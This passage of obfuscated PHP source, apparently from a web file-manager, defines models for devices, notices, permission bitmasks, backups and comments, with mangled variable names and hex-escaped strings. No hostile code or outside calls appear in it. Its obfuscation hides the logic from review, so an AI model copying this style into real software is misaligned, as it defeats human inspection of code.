isset($öÅ¨Äéß[$şº¿×¶[1966]])) { $öÅ¨Äéß[$şº¿×¶[85]] = $ôĞæÂ­™[$öÅ¨Äéß[$şº¿×¶[397]]]; $öÅ¨Äéß[$şº¿×¶[1979]] = $ôĞæÂ­™[$öÅ¨Äéß[$şº¿×¶[1966]]]; if ($öÅ¨Äéß[$şº¿×¶[29]] == $şº¿×¶[545]) { $öÅ¨Äéß[$şº¿×¶[445]][$şº¿×¶[1088]] = $ôĞæÂ­™[$öÅ¨Äéß[$şº¿×¶[445]][$şº¿×¶[1088]]]; $öÅ¨Äéß[$şº¿×¶[445]][$şº¿×¶[1089]] = $ôĞæÂ­™[$öÅ¨Äéß[$şº¿×¶[445]][$şº¿×¶[1089]]]; } if ($öÅ¨Äéß[$şº¿×¶[29]] == $şº¿×¶[1974]) { $öÅ¨Äéß[$şº¿×¶[445]][$şº¿×¶[397]] = $ôĞæÂ­™[$öÅ¨Äéß[$şº¿×¶[445]][$şº¿×¶[397]]]; } if ($öÅ¨Äéß[$şº¿×¶[29]] == $şº¿×¶[1714]) { $öÅ¨Äéß[$şº¿×¶[1979]] = $öÅ¨Äéß[$şº¿×¶[85]]; $öÅ¨Äéß[$şº¿×¶[1966]] = $öÅ¨Äéß[$şº¿×¶[1979]][$şº¿×¶[397]]; $öÅ¨Äéß[$şº¿×¶[85]] = !1; $öÅ¨Äéß[$şº¿×¶[397]] = $şº¿×¶[33]; } if ($öÅ¨Äéß[$şº¿×¶[85]] && $öÅ¨Äéß[$şº¿×¶[85]][$şº¿×¶[406]] == $şº¿×¶[1204]) { $¡°¨²çØ[] = $ğÓôÚù[$şº¿×¶[395]]; unset($Â›œŞŒí[$ø¨ÀáÔĞ]); continue; } if ($öÅ¨Äéß[$şº¿×¶[1979]] && $öÅ¨Äéß[$şº¿×¶[1979]][$şº¿×¶[406]] == $şº¿×¶[1204]) { $¡°¨²çØ[] = $ğÓôÚù[$şº¿×¶[395]]; unset($Â›œŞŒí[$ø¨ÀáÔĞ]); continue; } } $ğÓôÚù[$şº¿×¶[445]] = $öÅ¨Äéß; unset($ğÓôÚù[$şº¿×¶[2157]]); $Çš¿šÂÂ[] = $ğÓôÚù; } $this->clearSystemPathLog($¡°¨²çØ); return $Çš¿šÂÂ; } private function clearSystemPathLog($ò›˜ÃÂª) { $ĞªÙã·ã =& $_SERVER[ÏÒ Ì„]; if (count($ò›˜ÃÂª) == 0) { return; } $‘“÷Üï‹ = array($ĞªÙã·ã[395] => array($ĞªÙã·ã[7], array_unique($ò›˜ÃÂª))); $this->where($‘“÷Üï‹)->delete(); } public function deviceList($Âåˆ›¶, $¡Ÿñ×Ûä = 0) { $ÕÌó¦ŸÌ =& $_SERVER[ÏÒ Ì„]; $şµ‚Ğê¦ = array($ÕÌó¦ŸÌ[1578] => $Âåˆ›¶, $ÕÌó¦ŸÌ[194] => array($ÕÌó¦ŸÌ[1008], $¡Ÿñ×Ûä), $ÕÌó¦ŸÌ[29] => $ÕÌó¦ŸÌ[1688]); $¢èìÑ†Á = array(); $æ‹Ì¦ªı = $this->field($ÕÌó¦ŸÌ[2158])->where($şµ‚Ğê¦)->order($ÕÌó¦ŸÌ[1977])->limit(50)->select(); foreach ($æ‹Ì¦ªı as $ÒÙÌ‡ÒÖ => $°¸“´ı¼) { if ($ÒÙÌ‡ÒÖ > 0 && abs($°¸“´ı¼[$ÕÌó¦ŸÌ[194]] - $æ‹Ì¦ªı[$ÒÙÌ‡ÒÖ - 1][$ÕÌó¦ŸÌ[194]]) < 5) { continue; } $¼±Ì’µ´ = json_decode($°¸“´ı¼[$ÕÌó¦ŸÌ[445]], !0); $°¸“´ı¼[$ÕÌó¦ŸÌ[2148]] = isset($¼±Ì’µ´[$ÕÌó¦ŸÌ[2148]]) ? $¼±Ì’µ´[$ÕÌó¦ŸÌ[2148]] : $ÕÌó¦ŸÌ[33]; unset($¼±Ì’µ´[$ÕÌó¦ŸÌ[2148]]); $¹ŸıØáÆ = $this->deviceType($¼±Ì’µ´[$ÕÌó¦ŸÌ[1968]]); if (isset($¢èìÑ†Á[$¹ŸıØáÆ])) { continue; } $°¸“´ı¼[$ÕÌó¦ŸÌ[2152]] = IpLocation::get($°¸“´ı¼[$ÕÌó¦ŸÌ[2148]]); $°¸“´ı¼[$ÕÌó¦ŸÌ[445]] = $¼±Ì’µ´; $¢èìÑ†Á[$¹ŸıØáÆ] = $°¸“´ı¼; } return array_values($¢èìÑ†Á); } public function deviceType($ˆ¶èèòï) { return $ˆ¶èèòï; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\156\157\164\151\x63\145\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\143\x6f\x6e\164\145\156\x74", "\x61\x75\164\x68", "\x6d\x6f\x64\x65", "\x74\x69\x6d\x65", "\x74\171\160\145", "\154\145\x76\145\154", "\x65\156\x61\142\x6c\x65", "\x73\157\x72\x74"); public function listData($¸˜ÀŠÆ× = false, $¨ÈôŠ·„ = "\163\157\162\164", $•ˆÓ¥üé = false) { return parent::listData($¸˜ÀŠÆ×, $¨ÈôŠ·„, $•ˆÓ¥üé); } public function add($ì®ØÏ¨ù) { $çç¯¾çß =& $_SERVER[ÏÒ Ì„]; $îşÔÀºÆ = time(); if ($ì®ØÏ¨ù[$çç¯¾çß[12]] == $çç¯¾çß[2159]) { $îşÔÀºÆ = strtotime($ì®ØÏ¨ù[$çç¯¾çß[197]]); } $ì®ØÏ¨ù[$çç¯¾çß[197]] = $îşÔÀºÆ; return parent::insert($ì®ØÏ¨ù); } public function update($îİş©¸ø, $²ªÛİÕ¬) { $ïñÂ¾®¯ =& $_SERVER[ÏÒ Ì„]; $‘ŸŞ­Ò° = $this->listData($îİş©¸ø); if (!$‘ŸŞ­Ò°) { return !1; } $ş÷•Ÿ” = time(); if ($²ªÛİÕ¬[$ïñÂ¾®¯[12]] == $ïñÂ¾®¯[2159]) { $ş÷•Ÿ” = strtotime($²ªÛİÕ¬[$ïñÂ¾®¯[197]]); } $²ªÛİÕ¬[$ïñÂ¾®¯[197]] = $ş÷•Ÿ”; return parent::update($îİş©¸ø, $²ªÛİÕ¬); } public function remove($ëóÚñÖ) { $øÇ•‘¥è = $this->listData($ëóÚñÖ); if (!$øÇ•‘¥è || $øÇ•‘¥è[$_SERVER[ÏÒ Ì„][1204]]) { return !1; } return parent::remove($ëóÚñÖ); } public function sort($õ‘»ä¬Œ, $ğÍòÏİÂ) { return parent::update($õ‘»ä¬Œ, $ğÍòÏİÂ); } public function enable($·ô—Üòˆ, $ôàµ¶åË) { return parent::update($·ô—Üòˆ, array($_SERVER[ÏÒ Ì„][2160] => $ôàµ¶åË)); } private function initUserOption() { $Áç“ñè× =& $_SERVER[ÏÒ Ì„]; $this->optionType = $Áç“ñè×[2161]; $this->modelType = $Áç“ñè×[2162]; $this->field = array($Áç“ñè×[2163], $Áç“ñè×[28], $Áç“ñè×[197], $Áç“ñè×[29], $Áç“ñè×[2164], $Áç“ñè×[740], $Áç“ñè×[189]); } public function userNoticeGet($âıäÔ’ê = false) { $this->initUserOption(); return parent::listData($âıäÔ’ê, $_SERVER[ÏÒ Ì„][395], !0); } public function userNoticeAdd($•ˆ¶â·ß) { $‘îá¿½ =& $_SERVER[ÏÒ Ì„]; $this->initUserOption(); $Œ¦§µ˜ò = $this->findByKey($‘îá¿½[2163], $•ˆ¶â·ß[$‘îá¿½[395]]); if ($Œ¦§µ˜ò) { return !0; } $Õ°î™å– = array($‘îá¿½[2163] => $•ˆ¶â·ß[$‘îá¿½[395]], $‘îá¿½[28] => $•ˆ¶â·ß[$‘îá¿½[28]], $‘îá¿½[197] => $•ˆ¶â·ß[$‘îá¿½[197]], $‘îá¿½[29] => isset($•ˆ¶â·ß[$‘îá¿½[29]]) ? $•ˆ¶â·ß[$‘îá¿½[29]] : 1, $‘îá¿½[2164] => isset($•ˆ¶â·ß[$‘îá¿½[2164]]) ? $•ˆ¶â·ß[$‘îá¿½[2164]] : 0, $‘îá¿½[740] => 0, $‘îá¿½[189] => 0); return parent::insert($Õ°î™å–); } public function userNoticeEdit($Â¨Áõ–Æ, $åíÑœÂæ) { $this->initUserOption(); return parent::update($Â¨Áõ–Æ, $åíÑœÂæ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\x6d\137\x6f\x70\164\x69\157\156"; protected $jsonField = array("\x6d\145\x6e\165", "\162\x6f\x6c\x65", "\x72\x6f\x6c\145\107\162\x6f\x75\x70", "\162\145\147\x69\x73\164", "\x65\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($å‘¹‹×³) { return "\x53\x79\x73\164\x65\x6d\117\160\164\x69\x6f\156\x5f{$å‘¹‹×³}"; } protected function optionDefault($»‘İÇÁ¶ = '') { $±¹ÔÊ‰ =& $_SERVER[ÏÒ Ì„]; if ($»‘İÇÁ¶ == $±¹ÔÊ‰[33]) { return $GLOBALS[$±¹ÔÊ‰[6]][$±¹ÔÊ‰[379]]; } } } goto fĞÂ…„ÑØ°; cŒõßÑ’ƒ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Â»‹ëÇ =& $_SERVER[ÏÒ Ì„]; $ÕîŸ‚£” = array(array($Â»‹ëÇ[415] => LNG($Â»‹ëÇ[1747]), $Â»‹ëÇ[1748] => $Â»‹ëÇ[1749], $Â»‹ëÇ[1750] => 1, $Â»‹ëÇ[1751] => 1, $Â»‹ëÇ[1752] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Â»‹ëÇ[415] => LNG($Â»‹ëÇ[1753]), $Â»‹ëÇ[1748] => $Â»‹ëÇ[1754], $Â»‹ëÇ[1750] => 2, $Â»‹ëÇ[1751] => 1, $Â»‹ëÇ[1752] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Â»‹ëÇ[415] => LNG($Â»‹ëÇ[1755]), $Â»‹ëÇ[1748] => $Â»‹ëÇ[1756], $Â»‹ëÇ[1750] => 3, $Â»‹ëÇ[1751] => 1, $Â»‹ëÇ[1752] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Â»‹ëÇ[415] => LNG($Â»‹ëÇ[1757]), $Â»‹ëÇ[1748] => $Â»‹ëÇ[1758], $Â»‹ëÇ[1750] => 4, $Â»‹ëÇ[1751] => 1, $Â»‹ëÇ[1752] => self::AUTH_SHOW | self::AUTH_VIEW), array($Â»‹ëÇ[415] => LNG($Â»‹ëÇ[1759]), $Â»‹ëÇ[1748] => $Â»‹ëÇ[1760], $Â»‹ëÇ[1750] => 5, $Â»‹ëÇ[1751] => 1, $Â»‹ëÇ[1752] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Â»‹ëÇ[415] => LNG($Â»‹ëÇ[1761]), $Â»‹ëÇ[1748] => $Â»‹ëÇ[1762], $Â»‹ëÇ[1750] => 6, $Â»‹ëÇ[1751] => 1, $Â»‹ëÇ[1752] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Â»‹ëÇ[415] => LNG($Â»‹ëÇ[1763]), $Â»‹ëÇ[1748] => $Â»‹ëÇ[1764], $Â»‹ëÇ[1750] => 7, $Â»‹ëÇ[1751] => 1, $Â»‹ëÇ[1752] => 0)); return $ÕîŸ‚£”; } public static function authCheck($…ÚÀåúÉ, $¥è¿âİ®) { $…ÚÀåúÉ = intval($…ÚÀåúÉ); if ($GLOBALS[$_SERVER[ÏÒ Ì„][499]]) { return !0; } if ($…ÚÀåúÉ <= 0) { return !1; } if (($…ÚÀåúÉ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($…ÚÀåúÉ & $¥è¿âİ®); } public static function authCheckShow($û´è§Ú˜) { return self::authCheck($û´è§Ú˜, self::AUTH_SHOW); } public static function authCheckView($úÜ¼ŠÚÍ) { return self::authCheck($úÜ¼ŠÚÍ, self::AUTH_VIEW); } public static function authCheckDownload($³Ï ¯ò) { return self::authCheck($³Ï ¯ò, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ï¦—‹’Š) { return self::authCheck($ï¦—‹’Š, self::AUTH_UPLOAD); } public static function authCheckEdit($Ü—½³´¹) { return self::authCheck($Ü—½³´¹, self::AUTH_EDIT); } public static function authCheckRemove($¼÷Éˆã) { return self::authCheck($¼÷Éˆã, self::AUTH_REMOVE); } public static function authCheckShare($È§şçõÎ) { return self::authCheck($È§şçõÎ, self::AUTH_SHARE); } public static function authCheckComment($ÄãÕ¿ş) { return self::authCheck($ÄãÕ¿ş, self::AUTH_COMMENT); } public static function authCheckEvent($şı³—ÎÀ) { return self::authCheck($şı³—ÎÀ, self::AUTH_EVENT); } public static function authCheckRoot($“Ì£åÍ¨) { return self::authCheck($“Ì£åÍ¨, self::AUTH_ROOT); } public static function authCheckAction($ƒÕÖ¶Ïó, $ïúæûÊ») { $ÜèäÛ§ =& $_SERVER[ÏÒ Ì„]; $ıŒ•„²† = array($ÜèäÛ§[1765] => self::AUTH_VIEW, $ÜèäÛ§[1127] => self::AUTH_DOWNLOAD, $ÜèäÛ§[107] => self::AUTH_UPLOAD, $ÜèäÛ§[1715] => self::AUTH_EDIT, $ÜèäÛ§[1714] => self::AUTH_REMOVE, $ÜèäÛ§[1725] => self::AUTH_SHARE, $ÜèäÛ§[352] => self::AUTH_COMMENT, $ÜèäÛ§[1566] => self::AUTH_EVENT, $ÜèäÛ§[1766] => self::AUTH_ROOT); if (!isset($ıŒ•„²†[$ïúæûÊ»])) { return; } $ÈÕÒ¦í– = $ıŒ•„²†[$ïúæûÊ»]; $ƒÕÖ¶Ïó = intval($ƒÕÖ¶Ïó); if ($ƒÕÖ¶Ïó <= 0) { return !1; } if (($ƒÕÖ¶Ïó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ƒÕÖ¶Ïó & $ÈÕÒ¦í–); } public static function authDisable($’¦µé¦º, $¶šÀäû) { if (intval($’¦µé¦º) <= 0) { return 0; } return intval($’¦µé¦º) & ~$¶šÀäû; } public $optionType = "\x53\x79\163\164\x65\x6d\56\163\x6f\165\162\x63\145\101\x75\x74\x68\114\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\141\x75\x74\150", "\x6c\x61\x62\145\154", "\144\x69\163\x70\154\141\171", "\x73\x79\x73\x74\x65\x6d", "\163\x6f\x72\164"); public function initData() { $ïŠñÍÍÛ = $this->authDefault(); foreach ($ïŠñÍÍÛ as $™‚ÈÏŸ…) { $this->add($™‚ÈÏŸ…); } } public function findAuth($ôÂ•¨, $€ƒ’ë­) { $‰å¹Ş—Ø =& $_SERVER[ÏÒ Ì„]; $ñ–ùÚ–è = parent::listData(); foreach ($ñ–ùÚ–è as $çËÚÕÇ›) { $˜¯¸¥ò¥ = intval($çËÚÕÇ›[$‰å¹Ş—Ø[408]]); if ($˜¯¸¥ò¥ <= 0 || $çËÚÕÇ›[$‰å¹Ş—Ø[1767]] == 0) { continue; } if (($˜¯¸¥ò¥ & $ôÂ•¨) != $ôÂ•¨) { continue; } if (($˜¯¸¥ò¥ & $€ƒ’ë­) != 0) { continue; } return $çËÚÕÇ›[$‰å¹Ş—Ø[395]]; } return !1; } public function findAuthReadOnly() { $âì¥—Ò¬ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ ª¥­™ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($âì¥—Ò¬, $ ª¥­™); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($ ç¤Á÷ì = false, $ïê£ü±Ô = "\163\157\162\x74", $Å‰Š’ö = false) { return parent::listData($ ç¤Á÷ì, $ïê£ü±Ô, $Å‰Š’ö); } public function update($ùÉ„ğÌ€, $Š¬¸÷ã) { $ê›£äØé =& $_SERVER[ÏÒ Ì„]; $¾Êşø²â = parent::listData($ùÉ„ğÌ€); $œú¿ğ¸ = $this->findByName($Š¬¸÷ã[$ê›£äØé[28]]); if (!$¾Êşø²â || $œú¿ğ¸ && $œú¿ğ¸[$ê›£äØé[395]] != $¾Êşø²â[$ê›£äØé[395]]) { return !1; } $this->filterAuth($Š¬¸÷ã[$ê›£äØé[408]]); return parent::update($ùÉ„ğÌ€, $Š¬¸÷ã); } public function remove($Ãøƒìáû) { $îÁÂ ô = parent::listData($Ãøƒìáû); if (!$îÁÂ ô || $îÁÂ ô[$_SERVER[ÏÒ Ì„][1204]]) { return !1; } return parent::remove($Ãøƒìáû); } public function add($–ÁŸé = array()) { $ÜŞ„Ø =& $_SERVER[ÏÒ Ì„]; if ($this->findByName($–ÁŸé[$ÜŞ„Ø[28]])) { return !1; } $â¡Ê•‘Ã = array($ÜŞ„Ø[28] => $ÜŞ„Ø[33], $ÜŞ„Ø[408] => 1, $ÜŞ„Ø[1768] => $ÜŞ„Ø[1756], $ÜŞ„Ø[1767] => 1, $ÜŞ„Ø[1204] => 0, $ÜŞ„Ø[1769] => 0); $–ÁŸé = array_merge($â¡Ê•‘Ã, $–ÁŸé); $–ÁŸé[$ÜŞ„Ø[1769]] = $this->getSort(); $this->filterAuth($–ÁŸé[$ÜŞ„Ø[408]]); return parent::insert($–ÁŸé); } private function getSort() { $öÛ€ =& $_SERVER[ÏÒ Ì„]; $ÖÕê±ßü = parent::listData(); $µ”Œóœ = array_to_keyvalue($ÖÕê±ßü, $öÛ€[33], $öÛ€[1769]); return empty($µ”Œóœ) ? 0 : max($µ”Œóœ) + 1; } private function filterAuth(&$êÓıÂ†‹) { if (!$êÓıÂ†‹) { return; } $Ğ˜í›ì = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $º’Å½¨ = array(); foreach ($Ğ˜í›ì as $Î¤æÍÎÁ) { if ($êÓıÂ†‹ & $Î¤æÍÎÁ) { $º’Å½¨[] = $Î¤æÍÎÁ; } } if (in_array(self::AUTH_ROOT, $º’Å½¨)) { $êÓıÂ†‹ = array_sum($Ğ˜í›ì); return; } $¤æØµë† = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($º’Å½¨ as $Î¤æÍÎÁ) { if (isset($¤æØµë†[$Î¤æÍÎÁ])) { $º’Å½¨ = array_merge($º’Å½¨, $¤æØµë†[$Î¤æÍÎÁ]); } } $º’Å½¨[] = self::AUTH_SHOW; $êÓıÂ†‹ = array_sum(array_unique($º’Å½¨)); } public function sort($ûéÒ”•É, $ÙóŸßê´) { return parent::update($ûéÒ”•É, $ÙóŸßê´); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\142\141\x63\153\x75\160\x4c\x69\163\x74"; public $field = array("\x69\157", "\x6e\141\x6d\x65", "\x73\164\141\164\x75\x73", "\x63\157\156\164\x65\156\x74", "\155\x61\x6e\x75\x61\x6c", "\x72\145\x73\x75\154\x74", "\x74\x69\x6d\145\x46\x72\157\155", "\x74\x69\155\145\x54\157"); public function config() { $Š‰éĞˆÔ =& $_SERVER[ÏÒ Ì„]; $ıâÄ²æ´ = Model($Š‰éĞˆÔ[760])->get($Š‰éĞˆÔ[772]); $ıâÄ²æ´ = json_decode($ıâÄ²æ´, !0); $ıâÄ²æ´ = is_array($ıâÄ²æ´) ? $ıâÄ²æ´ : array(); if (!isset($ıâÄ²æ´[$Š‰éĞˆÔ[745]])) { $ıâÄ²æ´[$Š‰éĞˆÔ[745]] = $Š‰éĞˆÔ[87]; } unset($ıâÄ²æ´[$Š‰éĞˆÔ[1548]]); Action($Š‰éĞˆÔ[1770])->taskInit(); Model($Š‰éĞˆÔ[1547])->cacheClear(); $ŞöØ‘÷¤ = $Š‰éĞˆÔ[1771]; $ÇÁ¨¼Üé = Model($Š‰éĞˆÔ[1772])->findByKey($Š‰éĞˆÔ[1566], $ŞöØ‘÷¤); if (!$ÇÁ¨¼Üé) { $ÇÁ¨¼Üé = array(); } if (isset($ÇÁ¨¼Üé[$Š‰éĞˆÔ[197]])) { $ÇÁ¨¼Üé[$Š‰éĞˆÔ[197]] = json_decode($ÇÁ¨¼Üé[$Š‰éĞˆÔ[197]], !0); } if (isset($ıâÄ²æ´[$Š‰éĞˆÔ[197]])) { $ÇÁ¨¼Üé[$Š‰éĞˆÔ[197]][$Š‰éĞˆÔ[1551]] = $ıâÄ²æ´[$Š‰éĞˆÔ[197]]; unset($ıâÄ²æ´[$Š‰éĞˆÔ[197]]); } return array_merge($ÇÁ¨¼Üé, $ıâÄ²æ´); } public function listData($¢ÃËË—ı = false, $ùÕıïÁ‘ = "\155\x6f\x64\151\x66\171\x54\x69\155\x65", $ÃÈïú¹ş = false) { return parent::listData($¢ÃËË—ı, $ùÕıïÁ‘, !0); } public function lastItem() { $˜©ÈØ = $this->listData(); return !empty($˜©ÈØ[0]) ? $˜©ÈØ[0] : null; } public function kill($÷¥‰®•¡) { $·ìŸş¤ =& $_SERVER[ÏÒ Ì„]; $³éŸÜÎÃ = $this->listData($÷¥‰®•¡); if (!$³éŸÜÎÃ || empty($³éŸÜÎÃ[$·ìŸş¤[28]])) { return !0; } Task::kill($·ìŸş¤[771]); Task::kill($·ìŸş¤[796]); Task::kill($·ìŸş¤[806]); $™Ï‹ò° = $³éŸÜÎÃ[$·ìŸş¤[28]]; $ÑûÚ¥¦ã = TEMP_FILES . $·ìŸş¤[768] . $™Ï‹ò° . $·ìŸş¤[8]; IO::remove($ÑûÚ¥¦ã, !1); return $this->remove($÷¥‰®•¡); } public function remove($ìºÚ„Óˆ) { $ğ‰õñ·Ä = $this->listData($ìºÚ„Óˆ); if (!$ğ‰õñ·Ä) { return !0; } return $this->backupRemove($ğ‰õñ·Ä); } private function backupRemove($¢ƒ•àëß) { parent::remove($¢ƒ•àëß[$_SERVER[ÏÒ Ì„][395]]); $ÇëÒºÇ¥ = $this->backupPath($¢ƒ•àëß); IO::remove($ÇëÒºÇ¥, !1); return !0; } private function backupPath($›¦‹óá) { $ì×§­î‘ =& $_SERVER[ÏÒ Ì„]; $Æ’ğ ï¯ = $›¦‹óá[$ì×§­î‘[28]]; $š×éÊÕÉ = Model($ì×§­î‘[760])->get($ì×§­î‘[761]); $Â§ÂÅ®Ÿ = substr(md5($ì×§­î‘[762] . $š×éÊÕÉ . $Æ’ğ ï¯), 0, 8); return "\173\x69\157\72{$›¦‹óá[$ì×§­î‘[742]]}\175\57\144\x61\x74\141\x62\x61\x73\x65\x2f\142\x61\143\x6b\165\x70\x2f" . $Æ’ğ ï¯ . $ì×§­î‘[71] . $Â§ÂÅ®Ÿ; } public function start() { $ÅŒà¿¼™ =& $_SERVER[ÏÒ Ì„]; if ($GLOBALS[$ÅŒà¿¼™[6]][$ÅŒà¿¼™[88]][$ÅŒà¿¼™[1773]] != $ÅŒà¿¼™[87]) { return !0; } $ìò›æÜÀ = $this->config(); if (!$ìò›æÜÀ || $ìò›æÜÀ[$ÅŒà¿¼™[1548]] != $ÅŒà¿¼™[87]) { return !1; } $´¥¬æ€ = $this->process(); foreach ($´¥¬æ€ as $Æ¥İÊ³ ) { if ($Æ¥İÊ³ ) { return Task::restart($Æ¥İÊ³ [$ÅŒà¿¼™[395]]); } } $×¹û¸ÊŸ = new Backup(); $¦‹—ş = $×¹û¸ÊŸ->db(); if ($¦‹—ş) { $¦‹—ş = $×¹û¸ÊŸ->dbFile(); if ($¦‹—ş && $ìò›æÜÀ[$ÅŒà¿¼™[745]] == $ÅŒà¿¼™[191]) { $¦‹—ş = $×¹û¸ÊŸ->file(); } } Backup::set(array($ÅŒà¿¼™[740] => 1, $ÅŒà¿¼™[490] => time())); return !0; } public function process() { $Î¦òÃşœ =& $_SERVER[ÏÒ Ì„]; return array($Î¦òÃşœ[748] => Task::get($Î¦òÃşœ[771]), $Î¦òÃşœ[752] => Task::get($Î¦òÃşœ[796]), $Î¦òÃşœ[193] => Task::get($Î¦òÃşœ[806])); } public function restore() { $ì Ë¾Àç =& $_SERVER[ÏÒ Ì„]; ActionCall($ì Ë¾Àç[1054], !0, 1); ActionCall($ì Ë¾Àç[1054], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\x6e\164"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\155\145" => "\x63\157\x6d\155\x65\x6e\164\137\155\x65\x74\x61", "\x6d\145\x74\141\x46\151\x65\154\x64" => "\x63\x6f\x6d\155\x65\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($´À´§¬) { $Â‡ÄÑ =& $_SERVER[ÏÒ Ì„]; if ($´À´§¬[$Â‡ÄÑ[1774]]) { $åæŸÔ˜ = $this->where(array($Â‡ÄÑ[1775] => $´À´§¬[$Â‡ÄÑ[1774]]))->find(); if (!$åæŸÔ˜ || $åæŸÔ˜[$Â‡ÄÑ[406]] != $´À´§¬[$Â‡ÄÑ[406]] || $åæŸÔ˜[$Â‡ÄÑ[498]] != $´À´§¬[$Â‡ÄÑ[498]]) { return !1; } $this->where(array($Â‡ÄÑ[1775] => $´À´§¬[$Â‡ÄÑ[1774]]))->setAdd($Â‡ÄÑ[1776], 1); } $´À´§¬[$Â‡ÄÑ[1777]] = 0; $´À´§¬[$Â‡ÄÑ[1776]] = 0; $´À´§¬[$Â‡ÄÑ[740]] = 1; return $this->add($´À´§¬); } public function commentCount($û†ŸóÒÑ, $ì„Æ›ª, $ÎÔö‘©‘ = false) { $Å±÷Ò‘ù =& $_SERVER[ÏÒ Ì„]; if (!$û†ŸóÒÑ) { return array(); } if (is_string($û†ŸóÒÑ) || is_int($û†ŸóÒÑ)) { $û†ŸóÒÑ = array($û†ŸóÒÑ); } $‚İ­”ß² = array($Å±÷Ò‘ù[498], $Å±÷Ò‘ù[1778] => $Å±÷Ò‘ù[494]); $ößĞ‚ÓÔ = array($Å±÷Ò‘ù[498] => array($Å±÷Ò‘ù[7], $û†ŸóÒÑ), $Å±÷Ò‘ù[406] => $ì„Æ›ª); if ($ÎÔö‘©‘) { $ößĞ‚ÓÔ[$Å±÷Ò‘ù[1578]] = $ÎÔö‘©‘; } $€ıœª•É = $this->field($‚İ­”ß²)->where($ößĞ‚ÓÔ)->group($Å±÷Ò‘ù[498])->select(); return array_to_keyvalue($€ıœª•É, $Å±÷Ò‘ù[498], $Å±÷Ò‘ù[494]); } public function starTarget($öóûø‚â, $Ô›ï¼äï) { $«­ºä˜ù =& $_SERVER[ÏÒ Ì„]; $Õé¹œ€Ó = $öóûø‚â + self::TYPE_STAR_OFFSET; $µÂõ´… = array($«­ºä˜ù[1578] => USER_ID, $«­ºä˜ù[406] => $Õé¹œ€Ó, $«­ºä˜ù[498] => $Ô›ï¼äï); $«»ºŸã = $this->where($µÂõ´…)->find(); if ($«»ºŸã) { return $this->where(array($«­ºä˜ù[395] => $«»ºŸã[$«­ºä˜ù[395]]))->delete(); } $©î··âõ = array($«­ºä˜ù[1774] => 0, $«­ºä˜ù[1578] => USER_ID, $«­ºä˜ù[740] => 1, $«­ºä˜ù[745] => $«­ºä˜ù[33], $«­ºä˜ù[406] => $Õé¹œ€Ó, $«­ºä˜ù[498] => $Ô›ï¼äï, $«­ºä˜ù[1777] => 0, $«­ºä˜ù[1776] => 0); return $this->add($©î··âõ); } public function starTargetCount($šÀü®Ö, $ĞÑİÕ) { $çÓúµûÓ =& $_SERVER[ÏÒ Ì„]; $Ñ•ÚŞ¯– = $ĞÑİÕ + self::TYPE_STAR_OFFSET; $Û±öñ´Ç = $this->commentCount($šÀü®Ö, $Ñ•ÚŞ¯–); $Øü˜ƒø = $this->commentCount($šÀü®Ö, $Ñ•ÚŞ¯–, USER_ID); return array($çÓúµûÓ[1779] => $Û±öñ´Ç, $çÓúµûÓ[1780] => $Øü˜ƒø); } public function starTargetUserList($‚¶»»Êú, $”Ğ¸µĞĞ) { $ü¨ã¢¨… =& $_SERVER[ÏÒ Ì„]; $ûŸ¹¥İ = $‚¶»»Êú + self::TYPE_STAR_OFFSET; 